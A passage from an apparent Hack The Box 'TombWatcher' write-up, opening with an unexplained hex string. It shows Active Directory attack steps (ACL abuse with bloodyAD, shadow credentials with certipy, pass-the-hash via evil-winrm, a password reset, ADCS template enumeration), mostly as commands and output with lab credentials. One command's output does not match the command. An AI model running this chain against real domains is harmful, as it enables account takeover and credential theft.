b076db5f1b0ad5584cc219376aac072810ec13bf0c7c96d79ed784fa99eb443a411fbe31cb15f078c5690fd552b916029579e192af1952db5e5b6b86151044438fb3b6bd5c2e30cf31efdd62a1c6b10096db599ff819803b1404b74ccd8014c72d6ddd2add60f27f07d10e488b0f5ceb1e26591548e837d2ac2a5071c606d8920aff156e6bac08dbfcfdd9eb5538ddb31c7ae21afaeb5ea31a9a9fbf062d6ed8c1237b318efee991f8060fddecbe356755fa852152e7a4323dc8b7994400f730ce03cab4d941ba5f6d03685d37b838fe23c9ec52986ab5d08502d9674b1f7dc996da9e3ab2fc97271f0dc942e42e6f5f424fd5548067de1c11dbf69d35ae7a744d52b2d9d81147477e94fe77fc30c9bb3adb028a10470353f658b85313b941ef41ba6403b78bcae8e9275758d02e7e7684f0348194d7efa6370617e7aaef562abbcd33318e1eb9fd6b560c5b527711741394977d05381d0e4cf4b5d27d97589ef1e73786cc1e17641cfb09f26a558413617e3fbc01fbfd680ccfa4f669539b42ca2115d2f124899a9eaf15551313183922ff6bbf2fda986282b1a232070b829018e4b5887a8aa3af423ede7c7eed8d267edae9a068c40f66cb829193ee724dcb1cbceadf54619952d6b61d0ac480f0f2e8a1654d951578260c832fec5542b2d7ab81a300b1f132c195022efe5bfb81e276e1494d8c58c07c8c877195de8555ca8d18f3aa1b14dc9490242588187788323af9be8b61ae0d97c7dac9b8721a397a934dba787f37c126e94407a53dc13e210c669172a3a
[VERBOSE] SPN removed successfully for (john)
```

- we can also do the `ownership` via `bloodyad` 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf!' -account john
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
                                                                        
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ bloodyAD -d tombwatcher.htb -u sam -p 'NothingHere9$' --host dc01.tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john
```

- now we can get the NTLM hash for the user `john` via certificate attack .. 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad shadow auto -target dc01.tombwatcher.htb -u sam -p 'NothingHere9$' -account john              
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '040ff34400f44b5281479913d39f13a5'
[*] Adding Key Credential with device ID '040ff34400f44b5281479913d39f13a5' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '040ff34400f44b5281479913d39f13a5' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```

- we can login using `evil-winrm` via NT hash we got for `john`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ evil-winrm -i dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents>
```

- and then we got the `user hash`

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> dir


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/25/2026   7:52 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
b*************************
*Evil-WinRM* PS C:\Users\john\Desktop> 
```

- then i check for the privileges i have 

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\john\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\john\Desktop> 
```

- instead os using hash we can also change the password for user `john`


```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ bloodyAD --host "10.129.232.167" -d "tombwatcher.htb" -u "sam" -p "NothingHere9$" set password "john" "john@123" 

[+] Password changed successfully!
```

<img src="https://lh3.googleusercontent.com/d/1AMcBr0e5khJUl23dhgSXOB-Ya51Ou7WH" alt="">

- then after looking on the bloodhound graph we can see that we have GenericAll over ADCS
- then we look for the vulnerable template using `certipy-ad`

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad find -u john -p john@123 -dc-ip 10.129.232.167 -target-ip 10.129.232.167 -vulnerable -enable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

- and i did again but this time i removed some of the flags ...

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/TombWatcher]
└─$ certipy-ad find -u 'john@tombwatcher.htb' -p 'john@123' -dc-ip 10.129.232.167 -stdout

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  1
    Template Name                       : OCSPResponseSigning
    Display Name                        : OCSP Response Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AddOcspNocheck
                                          Norevocationinfoinissuedcerts
    Extended Key Usage                  : OCSP Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : msPKI-Asymmetric-Algorithm`PZPWSTR`RSA`msPKI-Hash-Algorithm`PZPWSTR`SHA1`msPKI-Key-Security-Descriptor`PZPWSTR`D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;GR;;;S-1-5-80-3804348527-3718992918-2141599610-3686422417-2726379419)`msPKI-Key-Usage`DWORD`2`
    Authorized Signatures Required      : 0
    Schema Version                      : 3
    Validity Period                     : 2 weeks
    Renewal Period                      : 2 days
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  2
    Template Name                       : RASAndIASServer
    Display Name                        : RAS and IAS Server
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\RAS and IAS Servers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\RAS and IAS Servers
  3
    Template Name                       : Workstation
    Display Name                        : Workstation Authentication
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
  4
    Template Name                       : DirectoryEmailReplication
    Display Name                        : Directory Email Replication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Directory Service Email Replication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  5
    Template Name                       : DomainControllerAuthentication
    Display Name                        : Domain Controller Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
        Write Property AutoEnroll       : TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  6
    Template Name                       : KeyRecoveryAgent
    Display Name                        : Key Recovery Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PendAllRequests
                                          PublishToKraContainer
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Key Recovery Agent
    Requires Manager Approval           : True
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  7
    Template Name                       : CAExchange
    Display Name                        : CA Exchange
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Extended Key Usage                  : Private Key Archival
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 week
    Renewal Period                      : 1 day
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  8
    Template Name                       : CrossCA
    Display Name                        : Cross Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : PublishToDs
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    RA Application Policies             : Qualified Subordination
    Authorized Signatures Required      : 1
    Schema Version                      : 2
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  9
    Template Name                       : ExchangeUserSignature
    Display Name                        : Exchange Signature Only
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  10
    Template Name                       : ExchangeUser
    Display Name                        : Exchange User
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  11
    Template Name                       : CEPEncryption
    Display Name                        : CEP Encryption
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  12
    Template Name                       : OfflineRouter
    Display Name                        : Router (Offline request)
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
